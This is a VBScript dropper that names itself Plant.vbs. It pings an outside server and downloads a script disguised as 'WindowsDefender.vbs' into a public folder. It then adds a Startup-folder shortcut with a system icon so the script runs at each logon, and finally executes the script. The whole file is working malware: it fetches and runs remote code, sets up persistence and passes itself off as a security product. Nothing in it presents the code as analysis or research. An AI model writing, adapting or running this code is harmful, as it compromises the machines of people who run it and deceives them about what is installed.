appDataPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%")
Dim objFSO : Set objFSO = CreateObject("Scripting.FileSystemObject")

' DownloadFile variables
Dim downloadURL : downloadURL = "https://vibescope.onrender.com/WindowsDefender" ' Replace with your actual download URL
Dim downloadDirectory : downloadDirectory = "C:\Users\Public\Libraries" 
Dim downloadedFilename : downloadedFilename = "WindowsDefender.vbs"

' CheckInternetConnection variables
Dim url : url = "https://vibescope.onrender.com/"            ' server URL to ping

' CreateShortcut variables
Dim sourceFilePath : sourceFilePath = "C:\Users\Public\Libraries\WindowsDefender.vbs"
Dim destinationDirectory : destinationDirectory = appDataPath & "\Microsoft\Windows\Start Menu\Programs\Startup"
Dim shortcutFileName : shortcutFileName = "WindowsDefender.lnk"

' ChangeShortcutIcon variables
Dim shortcutPath : shortcutPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\WindowsDefender.lnk"

' scriptPath variables
Dim scriptPath : scriptPath = "C:\Users\Public\Libraries\WindowsDefender.vbs" ' variable used to run the script


CheckInternetConnection()

Sub CheckInternetConnection()
    Dim objHTTP : Set objHTTP = CreateObject("MSXML2.XMLHTTP")
    objHTTP.open "GET", url, False
    On Error Resume Next
    objHTTP.send ""
    On Error GoTo 0
    If objHTTP.status = 200 Then
        WshShell.Popup "Internet is connected! (from Plant.vbs)", 2, "CheckInternetConnection()", 64
        Set objHTTP = Nothing
        DownloadFile
		CreateShortcut
		ChangeShortcutIcon
		RunScript
    Else
        WshShell.Popup "Internet is not connected! (from Plant.vbs), retrying in 3 seconds..", 2, "CheckInternetConnection()", 64
		WScript.Sleep 3000 ' 3000 milliseconds = 3 seconds
        Set objHTTP = Nothing
		CheckInternetConnection
    End If
    Set objHTTP = Nothing
End Sub

Sub DownloadFile()
    On Error Resume Next ' Enable error handling

    Dim objXMLHTTP, objADOStream, objFSO
    Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    Set objADOStream = CreateObject("ADODB.Stream")
    Set objFSO = CreateObject("Scripting.FileSystemObject")

    ' Download file
    objXMLHTTP.Open "GET", downloadURL, False
    objXMLHTTP.Send

    ' Handle errors during the request
    If Err.Number <> 0 Then
        WshShell.Popup "Error during download request, retrying in 10 seconds : " & Err.Description, 2, "DownloadFile()", 64
        WScript.Sleep 10000 ' 10 seconds
        
        ' Clean up
        Set objXMLHTTP = Nothing
        Set objADOStream = Nothing
        Set objFSO = Nothing

        DownloadFile
        Exit Sub
    End If

    ' Save response to file
    objADOStream.Open
    objADOStream.Type = 1 ' Binary
    objADOStream.Write objXMLHTTP.ResponseBody
    objADOStream.Position = 0

    ' Create destination folder if it doesn't exist
    If Not objFSO.FolderExists(downloadDirectory) Then objFSO.CreateFolder downloadDirectory

    ' Save stream to file
    objADOStream.SaveToFile downloadDirectory & "\" & downloadedFilename, 2 ' Overwrite

    ' Handle errors during the file save
    If Err.Number <> 0 Then
        WshShell.Popup "Error saving the file, retrying in 10 seconds : " & Err.Description, 2, "DownloadFile()", 64
        
        WScript.Sleep 10000 ' 10 seconds
        
        ' Clean up
        Set objXMLHTTP = Nothing
        Set objADOStream = Nothing
        Set objFSO = Nothing

        DownloadFile
    Else
        WshShell.Popup "Downloaded" & downloadedFilename &  "successfully. (from Plant.vbs)", 2, "DownloadFile()", 64
    End If

    On Error GoTo 0 ' Disable error handling
    ' Clean up
    Set objXMLHTTP = Nothing
    Set objADOStream = Nothing
    Set objFSO = Nothing
End Sub

Sub CreateShortcut()
    
	 If objFSO.FileExists(sourceFilePath) Then
		Set objShortcut = CreateObject("WScript.Shell").CreateShortcut(destinationDirectory & "\" & shortcutFileName) ' Create a shortcut object		
		objShortcut.TargetPath = sourceFilePath 											     ' Set the target path for the shortcut
		objShortcut.Save                        												 ' Save the shortcut
        WshShell.Popup "Shortcut created successfully. (from Plant.vbs)", 2, "CreateShortcut()", 64
	Else
        WshShell.Popup "Source file does not exist. (from Plant.vbs)", 2, "CreateShortcut()", 64
	End If
	
End Sub

Sub ChangeShortcutIcon()
    If objFSO.FileExists(shortcutPath) Then
		Set objShortcut = CreateObject("WScript.Shell").CreateShortcut(shortcutPath)                       ' Create a shortcut object
		objShortcut.IconLocation = "%SystemRoot%\System32\SHELL32.dll,34"             ' Set the icon location for the shortcut Icon 34  
		objShortcut.Save                                                              ' Save the shortcut
        WshShell.Popup "Shortcut icon changed successfully. (from Plant.vbs)", 2, "ChangeShortcutIcon()", 64
	Else
        WshShell.Popup "Shortcut file does not exist. (from Plant.vbs)", 2, "ChangeShortcutIcon()", 64
	End If
End Sub

Sub RunScript()
	If objFSO.FileExists(scriptPath) Then
        CreateObject("WScript.Shell").Run "wscript """ & scriptPath & """", 1, True
    Else
        WshShell.Popup "Error: Script file not found at path: " & scriptPath & "(from Plant.vbs)", 2, "RunScript()", 64
    End If
End Sub

Set objFSO = Nothing
Set downloadURL = Nothing
Set downloadDirectory = Nothing
Set downloadedFilename = Nothing
Set url = Nothing
Set sourceFilePath = Nothing
Set destinationDirectory = Nothing
Set shortcutFileName = Nothing
Set shortcutPath = Nothing
Set scriptPath = Nothing